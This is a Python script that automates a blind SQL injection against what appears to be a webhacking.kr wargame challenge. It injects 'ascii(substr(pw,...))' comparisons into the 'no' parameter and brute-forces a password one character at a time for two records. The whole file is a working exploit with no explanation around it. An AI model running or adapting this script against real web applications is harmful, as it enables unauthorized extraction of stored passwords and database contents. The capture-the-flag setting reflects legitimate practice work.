import requests
import string

url = 'http://webhacking.kr/challenge/bonus/bonus-1/index.php?'
params = {'PHPSESSID' : 'my_session'}
chr_list = string.ascii_lowercase + '1234567890' + '!@#$%^&*()_+=-{}[]'
password = ''

#no=1
for i in range (1,6) :
    for j in chr_list :
        sql_query = 'no=1 and ascii(substr(pw,'+str(i)+',1))='+str(hex(ord(j)))
        pay_load = url + sql_query
        res = requests.get(pay_load,params=params)
        if((res.text).find("True")>0):
            password += j
            break
print (str(i)+" password : "+password)
password=''

#no=2
for i in range (1,20) :
    for j in chr_list :
        sql_query = 'no=2 and ascii(substr(pw,'+str(i)+',1))='+str(hex(ord(j)))
        pay_load = url + sql_query
        res = requests.get(pay_load,params=params)
        if((res.text).find("True")>0):
            password += j
            break
print (str(i)+" password : "+password)
